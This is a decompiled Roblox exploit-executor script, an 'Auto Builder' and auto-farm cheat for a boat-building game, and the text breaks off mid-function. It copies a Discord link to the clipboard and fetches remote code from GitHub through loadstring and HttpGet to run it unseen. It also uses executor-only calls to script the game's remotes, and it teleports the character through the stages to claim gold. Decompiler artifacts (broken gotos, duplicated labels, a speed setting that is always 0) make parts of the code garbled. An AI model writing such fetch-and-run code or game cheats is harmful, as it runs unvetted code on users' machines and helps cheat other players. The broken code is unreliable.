-- filename: 
-- version: lua51
-- line: [0, 0] id: 0
-- notice: unreachable block#34
_G.tidolbaeb = "ti dymal esly ispolsiesh _G to naidesh choto tak vot ti nashel"
print("Credits to Sten for the original source")
print("by : (slade_yt) discord")
print("Server discord (https://discord.gg/HjNaYs6AnV) - copied")
print("RightControl open or close gui")
print("if you find a bug, write to me (my discord) ")
setclipboard("https://discord.gg/HjNaYs6AnV")
local r0_0 = loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-v2-source-/main/liba.txt"))()
local r1_0 = loadstring(game:HttpGet("https://raw.githubusercontent.com/max2007killer/auto-build-v2-source-/main/listing.txt"))()
print(r0_0)
local r2_0 = game:GetService("ReplicatedStorage")
local r3_0 = game:GetService("HttpService")
local r4_0 = game:GetService("Players")
local r5_0 = nil
local r6_0 = r2_0.BuildingParts
local r7_0 = {
  blue = workspace["Really blueZone"],
  yellow = workspace["New YellerZone"],
  red = workspace["Really redZone"],
  magenta = workspace.MagentaZone,
  black = workspace.BlackZone,
  white = workspace.WhiteZone,
  green = workspace.CamoZone,
}
local r8_0 = nil
if workspace:FindFirstChild("BuildPreview") then
  r8_0 = workspace.BuildPreview
else
  r8_0 = Instance.new("Model")
  r8_0.Name = "BuildPreview"
  r8_0.Parent = workspace
end
local r9_0 = r4_0.LocalPlayer
local r10_0 = r9_0.Data
local r11_0 = 57.29577951308232
local r12_0 = 0.01
local r13_0 = Vector3.new(2, 2, 2)
local r14_0 = Color3.new
local r15_0 = Color3.fromRGB
local r16_0 = Vector3.new
local r17_0 = CFrame.new
local r18_0 = CFrame.Angles
local r19_0 = math.floor
local r20_0 = math.ceil
local r21_0 = math.rad
local r22_0 = math.pow
local r23_0 = math.abs
local r24_0 = string.split
local r25_0 = string.gsub
local r26_0 = string.find
local r27_0 = table.insert
local r28_0 = table.remove
local r29_0 = loadstring
local r30_0 = unpack
local r31_0 = task.spawn
local r32_0 = Instance.new("RemoteFunction").InvokeServer
local r33_0 = Instance.new("RemoteEvent").FireServer
local r34_0 = Instance.new("Model").SetPrimaryPartCFrame
local r35_0 = workspace.FindFirstChild
local r36_0 = workspace.GetDescendants
local r37_0 = workspace.GetChildren
local r38_0 = workspace.Destroy
local r39_0 = workspace.Clone
local r40_0 = CFrame.new().ToEulerAnglesXYZ
local r41_0 = CFrame.new().ToObjectSpace
local r42_0 = workspace:WaitForChild("BoatStages"):WaitForChild("NormalStages")
local r43_0 = workspace:WaitForChild("ClaimRiverResultsGold")
local r44_0 = syn
if r44_0 then
  r44_0 = syn.request
  if r44_0 then
  end
else
  r44_0 = request or http_request
end
local r45_0 = 1
local r46_0 = false
local function r47_0(r0_18)
  -- line: [0, 0] id: 18
  if r45_0 == 3 then
    wait()
    return false
  end
  if r45_0 == 2 then
    wait()
    return true
  end
  if r45_0 == 1 then
    if r0_18 % 2 == 0 then
      task.wait()
    end
    return true
  end
  return true
end
local function r48_0(r0_51)
  -- line: [0, 0] id: 51
  local r1_51 = setmetatable({}, {
    __mode = "v",
  })
  return function(r0_52)
    -- line: [0, 0] id: 52
    local r1_52 = r1_51[r0_52]
    if not r1_52 then
      r1_52 = r0_51(r0_52)
    end
    r1_51[r0_52] = r1_52
    return r1_52
  end
end
function ListBuilds()
  -- line: [0, 0] id: 71
  local r0_71 = listfiles("")
  local r1_71 = {}
  for r5_71, r6_71 in next, r0_71, nil do
    if string.sub(r6_71, #r6_71 - 5, #r6_71) == ".Build" then
      r27_0(r1_71, string.sub(r6_71, 0, #r6_71 - 6))
    end
  end
  return r1_71
end
local r49_0 = nil
local r50_0 = 16777216
local r51_0 = 65536
local r52_0 = 256
function r49_0(r0_60)
  -- line: [0, 0] id: 60
  local r1_60 = r19_0(r0_60 / r50_0)
  local r2_60 = r19_0((r0_60 - r1_60 * r50_0) / r51_0)
  local r3_60 = r19_0((r0_60 - r1_60 * r50_0 - r2_60 * r51_0) / r52_0)
  return {
    Color = r15_0(r1_60, r2_60, r3_60),
    Alpha = r19_0((r0_60 - r1_60 * r50_0 - r2_60 * r51_0 - r3_60 * r52_0) / 1),
  }
end
-- close: r50_0
r50_0 = r48_0
r51_0 = r49_0
r50_0 = r50_0(r51_0)
r49_0 = r50_0
function r50_0(r0_63, r1_63)
  -- line: [0, 0] id: 63
  local r2_63 = Instance.new(r0_63)
  for r6_63, r7_63 in next, r1_63, nil do
    r2_63[r6_63] = r7_63
  end
  return r2_63
end
function r51_0(r0_59)
  -- line: [0, 0] id: 59
  local r1_59 = r24_0(r0_59, ",")
  return r18_0(r21_0(r1_59[1]), r21_0(r1_59[2]), r21_0(r1_59[3]))
end
AnglesString = r51_0
function r51_0(r0_2)
  -- line: [0, 0] id: 2
  return r25_0(tostring(r0_2), " ", "")
end
String = r51_0
function r51_0(r0_42)
  -- line: [0, 0] id: 42
  return r30_0(r24_0(r0_42, ","))
end
Raw = r51_0
function r51_0(r0_16, r1_16)
  -- line: [0, 0] id: 16
  return r19_0((r0_16 * 10 ^ r1_16 + 0.5)) / 10 ^ r1_16
end
Floor = r51_0
function r51_0(r0_27)
  -- line: [0, 0] id: 27
  local r1_27, r2_27, r3_27 = r40_0(r0_27)
  return Floor(r1_27 * r11_0, 5) .. "," .. Floor(r2_27 * r11_0, 5) .. "," .. Floor(r3_27 * r11_0, 5)
end
GetStringAngles = r51_0
function r51_0(r0_25)
  -- line: [0, 0] id: 25
  local r1_25, r2_25, r3_25 = r40_0(r0_25)
  return r18_0(r1_25, r2_25, r3_25)
end
GetAngles = r51_0
function r51_0()
  -- line: [0, 0] id: 28
  print(r9_0.Team)
end
GetTeam = r51_0
function r51_0()
  -- line: [0, 0] id: 47
  return r7_0[tostring(r9_0.Team)]
end
GetPlot = r51_0
r51_0 = {}
function r52_0(r0_8)
  -- line: [0, 0] id: 8
  local r1_8 = {}
  local r2_8 = next
  local r3_8, r4_8 = r4_0:GetPlayers()
  for r5_8, r6_8 in r2_8, r3_8, r4_8 do
    if tostring(r6_8.Team) == r0_8 then
      print(r0_8 .. " GetTeamPlayers")
      r27_0(r51_0, r0_8)
      r27_0(r1_8, r6_8.Name)
    end
  end
  return r1_8
end
GetTeamPlayers = r52_0
function r52_0()
  -- line: [0, 0] id: 57
  local r0_57 = r36_0(workspace.Blocks)
  local r1_57 = {}
  for r5_57, r6_57 in next, r0_57, nil do
    if r35_0(r6_57, "Health") then
      r27_0(r1_57, r6_57)
    end
  end
  return r1_57
end
GetBlocks = r52_0
function r52_0(r0_29)
  -- line: [0, 0] id: 29
  local r1_29 = GetTeamPlayers(r0_29)
  local r2_29 = {}
  local r3_29 = next
  local r4_29, r5_29 = GetBlocks()
  for r6_29, r7_29 in r3_29, r4_29, r5_29 do
    if table.find(r1_29, r7_29.Health.Value) then
      r27_0(r2_29, r7_29)
    end
  end
  return r2_29
end
GetTeamBlocks = r52_0
function r52_0()
  -- line: [0, 0] id: 20
  local r0_20 = {}
  local r1_20 = next
  local r2_20, r3_20 = r37_0(r8_0)
  for r4_20, r5_20 in r1_20, r2_20, r3_20 do
    r27_0(r0_20, r5_20)
  end
  return r0_20
end
GetPreviewBlocks = r52_0
function r52_0(r0_46)
  -- line: [0, 0] id: 46
  local r1_46 = r35_0(r9_0.Backpack, r0_46)
  if r1_46 then
    r1_46 = r9_0.Backpack[r0_46].RF
    if r1_46 then
    end
  else
    r1_46 = r35_0(r9_0.Character, r0_46)
    if r1_46 then
      r1_46 = r9_0.Character[r0_46].RF
    end
  end
  return r1_46
end
GetTool = r52_0
r52_0 = nil
local r54_0 = r50_0("ImageLabel", {
  Parent = r50_0("ScreenGui", {
    Parent = game:GetService("CoreGui"),
  }),
  BackgroundTransparency = 1,
  Position = UDim2.new(0, 0, 1, -20),
  Size = UDim2.new(0, 140, 0, 20),
  Image = "rbxassetid://2851926732",
  ImageColor3 = Color3.fromRGB(20, 21, 23),
  SliceCenter = Rect.new(12, 12, 12, 12),
})
r50_0("ImageLabel", {
  Parent = r54_0,
  BackgroundTransparency = 1,
  Position = UDim2.new(0, 0, 1, -20),
  Size = UDim2.new(0, 140, 0, 40),
  Image = "rbxassetid://2851926732",
  ImageColor3 = Color3.fromRGB(20, 21, 23),
  ScaleType = Enum.ScaleType.Slice,
  SliceCenter = Rect.new(12, 12, 12, 12),
})
r50_0("TextLabel", {
  Parent = r50_0("ImageLabel", {
    Parent = r50_0("ImageLabel", {
      Parent = r54_0,
      BackgroundTransparency = 1,
      Position = UDim2.new(0, -10, 0, 0),
      Size = UDim2.new(0, 90, 0, 20),
      Image = "rbxassetid://2851926732",
      ImageColor3 = Color3.fromRGB(41, 74, 122),
      ScaleType = Enum.ScaleType.Slice,
      SliceCenter = Rect.new(12, 12, 12, 12),
    }),
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 10, 0, 0),
    Size = UDim2.new(0, 90, 0, 20),
    Image = "rbxassetid://2851926732",
    ImageColor3 = Color3.fromRGB(41, 74, 122),
    ScaleType = Enum.ScaleType.Slice,
    SliceCenter = Rect.new(12, 12, 12, 12),
  }),
  BackgroundTransparency = 1,
  Position = UDim2.new(0, 5, 0, 0),
  Size = UDim2.new(1, 0, 0, 20),
  ZIndex = 11,
  Font = Enum.Font.GothamBold,
  Text = "Progression",
  TextColor3 = Color3.fromRGB(255, 255, 255),
  TextSize = 14,
  TextXAlignment = Enum.TextXAlignment.Left,
})
r52_0 = r50_0("TextLabel", {
  Parent = r54_0,
  BackgroundTransparency = 1,
  Position = UDim2.new(0, 95, 0, 0),
  Size = UDim2.new(1, -95, 1, 0),
  Font = Enum.Font.GothamBold,
  Text = " NaN",
  TextColor3 = Color3.fromRGB(255, 255, 255),
  TextSize = 14,
  TextXAlignment = Enum.TextXAlignment.Left,
})
local r53_0 = 0
r54_0 = 0
function UpdateProgression(r0_6)
  -- line: [0, 0] id: 6
  local r1_6 = r52_0
  local r2_6 = typeof(r0_6)
  if r2_6 == "number" then
    r2_6 = r20_0(r0_6) .. "%"
    if r2_6 then
    end
  else
    r2_6 = r0_6
  end
  r1_6.Text = r2_6
end
function Encode(r0_58, r1_58)
  -- line: [0, 0] id: 58
  local r2_58 = {}
  local r3_58 = nil	-- notice: implicit variable refs by block#[3]
  if r1_58 then
    r3_58 = r7_0[r1_58]
    if not r3_58 then
      ::label_7::
      r3_58 = GetPlot()
    end
  else
    goto label_7	-- block#2 is visited secondly
  end
  r5_0 = r3_58
  r3_58 = next
  for r6_58, r7_58 in r3_58, r0_58, nil do
    local r8_58 = r7_58.Name
    local r9_58 = r7_58.PPart
    if not r2_58[r8_58] then
      r2_58[r8_58] = {}
    end
    local r10_58 = r41_0(r5_0.CFrame, r9_58.CFrame)
    local r11_58 = r27_0
    local r12_58 = r2_58[r8_58]
    local r13_58 = {
      Rotation = GetStringAngles(r10_58),
      Position = String(r10_58.p),
    }
    if r9_58.CastShadow ~= true then
      local r14_58 = false
    else
      local r14_58 = nil
      r13_58.ShowShadow = r14_58
    end
    if r9_58.CanCollide ~= true then
      local r14_58 = false
    else
      local r14_58 = nil
      r13_58.CanCollide = r14_58
    end
    if r9_58.Anchored ~= true then
      local r14_58 = false
    else
      local r14_58 = nil
      r13_58.Anchored = r14_58
    end
    local r14_58 = r9_58.Transparency
    if r14_58 <= 0 then
      goto label_69
    else
      r14_58 = r9_58.Transparency
      if not r14_58 then
        ::label_69::
        ::label_69::
        r14_58 = nil
      end
    end
    r13_58.Transparency = r14_58
    r14_58 = r26_0(r8_58, "Block")
    if not r14_58 then
      goto label_92
    else
      r14_58 = r9_58.Size
      if r14_58 ~= r16_0(2, 2, 2) then
        r14_58 = String(r9_58.Size)
        if r14_58 then
        end
      else
        ::label_92::
        ::label_92::
        r14_58 = nil
      end
    end
    r13_58.Size = r14_58
    r14_58 = r9_58.Color
    if r14_58 == r6_0[r8_58].PPart.Color then
      goto label_107
    else
      r14_58 = String(r9_58.Color)
      if not r14_58 then
        ::label_107::
        ::label_107::
        r14_58 = nil
      end
    end
    r13_58.Color = r14_58
    r11_58(r12_58, r13_58)
  end
  return r3_0:JSONEncode(r2_58)
end
function Decode(r0_68, r1_68)
  -- line: [0, 0] id: 68
  local r2_68 = {}
  if not r1_68 then
    r1_68 = 1
  end
  if not xpcall(function()
    -- line: [0, 0] id: 69
    r2_68 = r3_0:JSONDecode(r0_68)
  end, function()
    -- line: [0, 0] id: 70
    warn("Invalid JSON")
  end) then
    return {}
  end
  for r7_68, r8_68 in next, r2_68, nil do
    if r35_0(r6_0, r7_68) then
      for r12_68, r13_68 in next, r8_68, nil do
        local r14_68 = r2_68[r7_68][r12_68]
        r14_68.Position = r17_0(r16_0(Raw(r13_68.Position)) * r1_68)
        r14_68.Rotation = AnglesString(r13_68.Rotation)
        local r15_68 = r13_68.Color
        if r15_68 then
          r15_68 = r14_0(Raw(r13_68.Color))
          if r15_68 then
          end
        else
          r15_68 = nil
        end
        r14_68.Color = r15_68
        r15_68 = r13_68.Size
        if r15_68 then
          r15_68 = r13_68.Size
          if r15_68 ~= "2,2,2" then
            r15_68 = r16_0(Raw(r13_68.Size)) * r1_68 or nil
          end
        else
          goto label_72	-- block#15 is visited secondly
        end
        r14_68.Size = r15_68
        r2_68[r7_68][r12_68] = r14_68
      end
    else
      r2_68[r7_68] = nil
    end
  end
  return r2_68
end
function Convert(r0_66)
  -- line: [0, 0] id: 66
  local r1_66 = readfile(r0_66)
  local r2_66 = {}
  if not r26_0(r1_66, "/") then
    return nil
  end
  local r3_66 = GetPlot()
  local r4_66 = next
  local r5_66, r6_66 = r24_0(r1_66, "/")
  for r7_66, r8_66 in r4_66, r5_66, r6_66 do
    local r9_66 = r24_0(r8_66, ":")
    if #r9_66 == 5 and r35_0(r6_0, r9_66[5]) then
      if not r2_66[r9_66[5]] then
        r2_66[r9_66[5]] = {}
      end
      local r10_66 = r41_0(r17_0(0, -17.9999924, 0), r17_0(Raw(r9_66[1])) * AnglesString(r9_66[2]))
      local r11_66 = r27_0
      local r12_66 = r2_66[r9_66[5]]
      local r13_66 = {}
      local r14_66 = r9_66[3]
      if r14_66 == "-" then
        goto label_69
      else
        r14_66 = r9_66[3]
        if not r14_66 then
          ::label_69::
          ::label_69::
          r14_66 = nil
        end
      end
      r13_66.Color = r14_66
      r14_66 = r9_66[4]
      if r14_66 ~= "-" then
        r14_66 = r9_66[4]
        if r14_66 then
        end
      else
        r14_66 = nil
      end
      r13_66.Size = r14_66
      r13_66.Position = String(r10_66.p)
      r13_66.Rotation = GetStringAngles(r10_66)
      r11_66(r12_66, r13_66)
    end
  end
  return r3_0:JSONEncode(r2_66)
end
function SavePlot(r0_31, r1_31)
  -- line: [0, 0] id: 31
  if not r0_31 then
    goto label_6
  elseif not r1_31 then
    ::label_6::
    ::label_6::
    return 
  end
  writefile(r0_31, Encode(GetTeamBlocks(r1_31), r1_31))
end
function LoadBlocks(r0_40, r1_40)
  -- line: [0, 0] id: 40
  local r2_40 = nil	-- notice: implicit variable refs by block#[17]
  if not r1_40 then
    goto label_7
  else
    r2_40 = r7_0[r1_40]
    if not r2_40 then
      ::label_7::
      ::label_7::
      r2_40 = GetPlot()
    end
  end
  local r3_40 = GetTool("BuildingTool")
  local r4_40 = GetTool("ScalingTool")
  local r5_40 = GetTool("PaintingTool")
  local r6_40 = getsenv(r3_40.Parent.LocalScript).isPartInZone
  r53_0 = 0
  r54_0 = 0
  for r10_40, r11_40 in next, r0_40, nil do
    r53_0 = r53_0 + #r11_40
  end
  local r7_40 = {}
  local r8_40 = {}
  local r9_40 = nil
  local function r10_40(r0_41)
    -- line: [0, 0] id: 41
    r0_41:WaitForChild("PPart", 1)
    if not r35_0(r0_41, "PPart") then
      return 
    end
    for r4_41, r5_41 in next, r7_40, nil do
      if (r0_41.PPart.Position - r5_41.Position).Magnitude < r12_0 then
        r27_0(r8_40, {
          Block = r0_41,
          Data = r5_41.Data,
        })
        r28_0(r7_40, r4_41)
        r54_0 = r54_0 + 1
        UpdateProgression(50 - (r53_0 - r54_0) / r53_0 * 50)
        break
      end
    end
  end
  for r14_40, r15_40 in ipairs(workspace.Blocks:GetDescendants()) do
    if r15_40:IsA("Folder") then
      print(r15_40)
      r9_40 = r15_40.ChildAdded:Connect(r10_40)
    end
  end
  for r13_40, r14_40 in next, r0_40, nil do
    local r15_40 = r10_0[r13_40].Value
    local r16_40 = r10_0[r13_40].Used.Value
    for r20_40, r21_40 in next, r14_40, nil do
      if r15_40 - r16_40 >= r20_40 then
        local r22_40 = r2_40.CFrame * r21_40.Position * r21_40.Rotation
        if not r6_40(r22_40, r2_40) then
          r53_0 = r53_0 - 1
        else
          if r21_40.Size then
            goto label_129
          elseif not r21_40.Color and not r21_40.Transparency then
            if r21_40.Anchored then
              goto label_129
            elseif r21_40.CanCollide or r21_40.ShowShadow then
              ::label_129::
              ::label_129::
              r27_0(r7_40, {
                Position = r22_40.p,
                Data = r21_40,
              })
            end
          else
            goto label_129	-- block#27 is visited secondly
          end
          if r46_0 and #r7_40 <= 5 then
            repeat
              wait()
            until #r7_40 <= 5
          end
          if r47_0(r20_40) then
            local r23_40 = r31_0
            local r24_40 = r32_0
            local r25_40 = r3_40
            local r26_40 = r13_40
            local r27_40 = r15_40
            local r28_40 = nil
            local r29_40 = nil
            local r30_40 = r21_40.Anchored
            local r31_40 = nil	-- notice: implicit variable refs by block#[37]
            if r30_40 == nil then
              r30_40 = true
              r31_40 = r22_40
            else
              r30_40 = false
            end
            r23_40(r24_40, r25_40, r26_40, r27_40, r28_40, r29_40, r30_40, r31_40)
          end
        end
      else
        warn("Not Enough Blocks For " .. r13_40)
        break
      end
    end
  end
  repeat
    wait()
  until #r7_40 == 0
  r9_40:Disconnect()
  wait(1)
  r54_0 = 0
  for r13_40, r14_40 in next, r8_40, nil do
    local r15_40 = r14_40.Data.Size
    if r15_40 then
      r15_40 = r47_0(r13_40)
      if not r15_40 then
        goto label_216
      else
        r15_40 = r46_0
        if not r15_40 then
          r31_0(r32_0, r4_40, r14_40.Block, r14_40.Data.Size, r14_40.Block.PPart.CFrame)
        else
          ::label_216::
          ::label_216::
          print(2)
          r32_0(r4_40, r14_40.Block, r14_40.Data.Size, r14_40.Block.PPart.CFrame)
        end
      end
      r54_0 = r54_0 + 1
      UpdateProgression(99 - (r53_0 - r54_0) / r53_0 * 49)
    end
  end
  r10_40 = {}
  for r14_40, r15_40 in next, r8_40, nil do
    if r15_40.Data.Color then
      r27_0(r10_40, {
        r15_40.Block,
        r15_40.Data.Color
      })
    end
  end
  r32_0(r5_40, r10_40)
  UpdateProgression(100)
  wait(1.5)
  UpdateProgression("Done!")
end
function LoadFile(r0_17, r1_17, r2_17)
  -- line: [0, 0] id: 17
  local r3_17 = nil	-- notice: implicit variable refs by block#[5]
  if #r37_0(r8_0) > 0 then
    r3_17 = Decode(Encode(GetPreviewBlocks(), GetTeam()), r1_17)
  else
    r3_17 = Decode(Convert(r0_17) or readfile(r0_17), r1_17)
  end
  LoadBlocks(r3_17, r2_17)
end
function PreviewFile(r0_13, r1_13, r2_13)
  -- line: [0, 0] id: 13
  local r3_13 = Convert(r0_13)
  if not r3_13 then
    r3_13 = readfile(r0_13)
  end
  local r4_13 = Decode(r3_13, r1_13)
  local r5_13 = nil	-- notice: implicit variable refs by block#[10]
  if not r2_13 then
    goto label_21
  else
    r5_13 = r7_0[r2_13]
    if not r5_13 then
      ::label_21::
      ::label_21::
      r5_13 = GetPlot()
    end
  end
  for r9_13, r10_13 in next, r4_13, nil do
    for r14_13, r15_13 in next, r10_13, nil do
      local r16_13 = r39_0(r6_0[r9_13])
      r34_0(r16_13, r5_13.CFrame * r15_13.Position * r15_13.Rotation)
      r16_13.Health.Value = ""
      r16_13.Parent = r8_0
      local r18_13 = r16_13.PPart
      local r19_13 = r15_13.Size
      if not r19_13 then
        r19_13 = r16_13.PPart.Size
      end
      r18_13.Size = r19_13
      r18_13 = r16_13.PPart
      r19_13 = r15_13.Anchored
      if not r19_13 then
        r19_13 = true
      end
      r18_13.Anchored = r19_13
      if r15_13.Color then
        r18_13 = next
        local r19_13, r20_13 = r36_0(r16_13)
        for r21_13, r22_13 in r18_13, r19_13, r20_13 do
          if r22_13:IsA("BasePart") then
            r22_13.Color = r15_13.Color
          end
        end
      end
    end
  end
end
local r55_0 = 0
local r56_0 = 0
local r57_0 = 0
local r58_0 = Instance.new("Part", r8_0)
r58_0.Transparency = 1
r58_0.Anchored = true
r58_0.CanCollide = false
function reflectVec(r0_12, r1_12)
  -- line: [0, 0] id: 12
  return r0_12 - 2 * r1_12 * r0_12:Dot(r1_12)
end
function ReflectCFrame(r0_7, r1_7, r2_7)
  -- line: [0, 0] id: 7
  local r3_7 = r1_7.Position
  local r4_7 = r1_7.LookVector
  local r5_7 = r0_7.Position
  local r9_7 = r3_7 + reflectVec(r16_0(r5_7.X, r5_7.Y, r5_7.Z) - r3_7, r4_7)
  local r10_7 = -reflectVec(r0_7.XVector, r4_7)
  local r11_7 = reflectVec(r0_7.YVector, r4_7)
  local r12_7 = reflectVec(r0_7.ZVector, r4_7)
  return r17_0(r9_7.X, r9_7.Y, r9_7.Z, r10_7.X, r11_7.X, r12_7.X, r10_7.Y, r11_7.Y, r12_7.Y, r10_7.Z, r11_7.Z, r12_7.Z)
end
function MirrorBuild()
  -- line: [0, 0] id: 32
  local r0_32 = r8_0:GetBoundingBox()
  local r1_32 = next
  local r2_32, r3_32 = r37_0(r8_0)
  for r4_32, r5_32 in r1_32, r2_32, r3_32 do
    if r35_0(r5_32, "PPart") then
      r34_0(r5_32, ReflectCFrame(r5_32.PPart.CFrame, r0_32))
    end
  end
end
function UpdatePreview(r0_21)
  -- line: [0, 0] id: 21
  local r1_21, r2_21 = r8_0:GetBoundingBox()
  local r3_21 = nil	-- notice: implicit variable refs by block#[7]
  if not r0_21 then
    r3_21 = r16_0()
    r0_21 = r3_21
  end
  if r0_21 then
    r3_21 = r17_0(r1_21.Position)
    if r3_21 then
    end
  else
    r3_21 = r1_21
  end
  r3_21 = r3_21 * r18_0(r21_0(r55_0), r21_0(r56_0), r21_0(r57_0)) + r0_21
  r58_0.CFrame = r1_21
  r58_0.Parent = r8_0
  r8_0.PrimaryPart = r58_0
  r34_0(r8_0, r3_21)
  r58_0.Parent = workspace
end
function ClearPreview()
  -- line: [0, 0] id: 26
  local r0_26 = next
  local r1_26, r2_26 = r37_0(r8_0)
  for r3_26, r4_26 in r0_26, r1_26, r2_26 do
    r38_0(r4_26)
  end
end
function ListBuild(r0_48, r1_48)
  -- line: [0, 0] id: 48
  local r2_48 = Convert(r0_48)
  if not r2_48 then
    r2_48 = readfile(r0_48)
  end
  local r3_48 = Decode(r2_48, r1_48 or 1)
  local r4_48 = {}
  local r5_48 = {}
  for r9_48, r10_48 in next, r3_48, nil do
    local r11_48 = 0
    local r12_48 = 0
    for r16_48, r17_48 in next, r10_48, nil do
      if not r17_48.Size or r17_48.Size == r13_0 then
        r11_48 = r11_48 + 1
      else
        r11_48 = r11_48 + r20_0(r17_48.Size.X * r17_48.Size.Y * r17_48.Size.Z / 8 + 0.5)
      end
    end
    local r13_48 = r10_0[r9_48].Value
    r12_48 = r11_48 - r13_48
    r4_48[r9_48] = r11_48
    if r12_48 <= 0 then
      goto label_61
    else
      r13_48 = r12_48
      if r13_48 then
        ::label_61::
        ::label_61::
        r13_48 = nil
      end
    end
    r5_48[r9_48] = r13_48
  end
  r1_0:Clear()
  for r9_48, r10_48 in next, r4_48, nil do
    r1_0:Add(r9_48, r10_48, r5_48[r9_48])
  end
end
local function r59_0(r0_43, r1_43, r2_43, r3_43)
  -- line: [0, 0] id: 43
  return {
    Name = r0_43,
    PPart = {
      CFrame = r1_43,
      CastShadow = false,
      CanCollide = true,
      Anchored = true,
      Transparency = 0,
      Color = r3_43.Color,
      Size = r2_43,
    },
  }
end
local r60_0 = nil
local r61_0 = nil
local function r62_0(r0_37)
  -- line: [0, 0] id: 37
  local r1_37 = nil	-- notice: implicit variable refs by block#[4]
  if r61_0 == r0_37 then
    r1_37 = r60_0
  else
    print("New Request > " .. r0_37)
    r1_37 = r44_0({
      Url = "http://localhost:3000/image",
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json",
      },
      Body = r3_0:JSONEncode({
        url = r0_37,
      }),
    }).Body
    print("Got Body")
  end
  r61_0 = r0_37
  r60_0 = r1_37
  return r1_37
end
local function r63_0(r0_24, r1_24, r2_24, r3_24, r4_24)
  -- line: [0, 0] id: 24
  local r5_24 = r62_0(r0_24)
  if r3_24 == 0 then
    goto label_13
  else
    r3_24 = r20_0(r23_0(r3_24))
    if r3_24 then
      ::label_13::
      ::label_13::
      r3_24 = 1
    end
  end
  if r5_24 == "invalid" then
    return print("Invalid")
  end
  local r6_24 = r3_0:JSONDecode(r5_24)
  local r7_24 = r6_24.dimensions[1]
  local r8_24 = r6_24.dimensions[2]
  local r9_24 = GetPlot().CFrame
  local r10_24 = 5.1 + r8_24 / r3_24 * r2_24
  local r11_24 = r7_24 / r3_24 * r2_24 / 2
  local r12_24 = {}
  for r16_24 = 0, r8_24 / r3_24 - 1, 1 do
    for r20_24 = 0, r7_24 / r3_24 - 1, 1 do
      local r21_24 = r49_0(r6_24.pixels[(r16_24 * r7_24 + r20_24 + 1) * r3_24])
      local r22_24 = r9_24 + r16_0(-r20_24 * r2_24 + r11_24, -r16_24 * r2_24 + r10_24)
      local r23_24 = r16_0(r2_24, r2_24, r2_24)
      local r24_24 = 1 - r21_24.Alpha
      local r25_24 = r21_24.Color
      if r4_24 then
        local r26_24 = r39_0(r6_0[r1_24])
        r26_24.Parent = r8_0
        r26_24.PPart.Size = r23_24
        r26_24.PPart.Color = r25_24
        r26_24.PPart.CFrame = r22_24
        r26_24.PPart.Anchored = true
        r26_24.PPart.CanCollide = false
        r26_24.PPart.Transparency = r24_24
      else
        r27_0(r12_24, r59_0(r1_24, r22_24, r23_24, r21_24))
      end
    end
  end
  if not r4_24 then
    if #r37_0(r8_0) > 0 then
      r12_24 = GetPreviewBlocks()
    end
    LoadBlocks(Decode(Encode(r12_24), 1))
  end
end
local function r64_0(r0_22, r1_22)
  -- line: [0, 0] id: 22
  local r2_22 = r3_0:JSONDecode(r62_0(r0_22))
  local r3_22 = #r2_22.pixels
  local r4_22 = #r2_22.pixels - r10_0[r1_22].Value
  r1_0:Clear()
  local r5_22 = r1_0
  local r7_22 = r1_22
  local r8_22 = r3_22
  local r9_22 = nil	-- notice: implicit variable refs by block#[3]
  if r4_22 > 0 then
    r9_22 = r4_22
    if r9_22 then
      ::label_25::
      r9_22 = nil
    end
  else
    goto label_25	-- block#2 is visited secondly
  end
  r5_22:Add(r7_22, r8_22, r9_22)
end
local r65_0 = false
function AutoFarm(r0_4)
  -- line: [0, 0] id: 4
  r65_0 = r0_4
  while r65_0 do
    r50_0("BodyVelocity", {
      Velocity = Vector3.new(0, 0, 0),
      Parent = r9_0.Character.HumanoidRootPart,
    })
    for r4_4 = 1, 10, 1 do
      if not r9_0.Character or not r9_0.Character:FindFirstChild("Humanoid") then
        while true do
          wait()
          if r9_0.Character then
            local r5_4 = r9_0.Character:FindFirstChild("Humanoid")
            if r5_4 then
              break
            end
          end
        end
      end
      local r6_4 = r42_0["CaveStage" .. r4_4].DarknessPart.CFrame
      r9_0.Character.HumanoidRootPart.CFrame = r6_4
      local r5_4 = wait
      if r4_4 ~= 1 then
        goto label_68
      else
        r6_4 = 4
        if not r6_4 then
          ::label_68::
          ::label_68::
          r6_4 = 2
        end
      end
      r5_4(r6_4 + 0.1)
      r43_0:FireServer()
    end
    r9_0.Character:Remove()
    while true do
      wait()
      local r1_4 = r9_0.Character
      if r1_4 then
        r1_4 = r9_0.Character:FindFirstChild("HumanoidRootPart")
        if r1_4 then
          goto label_93	-- block#20 is visited secondly
        end
      end
    end
  end
end
local r66_0 = r0_0:AddWindow("Auto Builder", {
  main_color = r15_0(41, 74, 122),
  min_size = Vector2.new(300, 450),
  toggle_key = Enum.KeyCode.RightControl,
  can_resize = true,
})
local r67_0 = r66_0:AddTab("Main")
local r68_0 = nil
local r69_0 = 1
local r70_0 = r67_0:AddDropdown("Files", function(r0_55)
  -- line: [0, 0] id: 55
  r68_0 = r0_55 .. ".Build"
end)
local function r71_0()
  -- line: [0, 0] id: 33
  r70_0:Clear()
  local r0_33 = next
  local r1_33, r2_33 = ListBuilds()
  for r3_33, r4_33 in r0_33, r1_33, r2_33 do
    r70_0:Add(r4_33)
  end
end
r71_0()
r67_0:AddButton("Refresh Files", r71_0)
local r72_0 = nil
local r73_0 = nil
local r74_0 = r67_0:AddFolder("Saving")
r74_0:AddTextBox("File Name", function(r0_67)
  -- line: [0, 0] id: 67
  r72_0 = r0_67 .. ".Build"
end, {
  clear = false,
})
r74_0:AddDropdown("Team", function(r0_54)
  -- line: [0, 0] id: 54
  if r0_54 == "My Team" then
    r0_54 = r9_0.Team
  end
  r73_0 = r0_54
end):Add("My Team"):Add("white"):Add("blue"):Add("green"):Add("red"):Add("black"):Add("yellow"):Add("magenta")
r74_0:AddButton("Save To File", function()
  -- line: [0, 0] id: 61
  SavePlot(r72_0, r73_0)
  r71_0()
end)
r74_0:Fold(true)
local r75_0 = r67_0:AddFolder("Build Settings")
r75_0:AddSwitch("Safe Mode", function(r0_38)
  -- line: [0, 0] id: 38
  r46_0 = r0_38
end)
r75_0:AddDropdown("Speed", function(r0_10)
  -- line: [0, 0] id: 10
  r45_0 = 0 or 1 or 2 or 3
end):Add("Dangerous"):Add("Fast"):Add("Slow"):Add("Safe")
r75_0:AddTextBox("Size %", function(r0_3)
  -- line: [0, 0] id: 3
  r69_0 = r0_3 / 100
end, {
  clear = false,
})
r75_0:Fold(true)
local r76_0 = r67_0:AddFolder("Builder")
r76_0:AddButton("List Blocks", function()
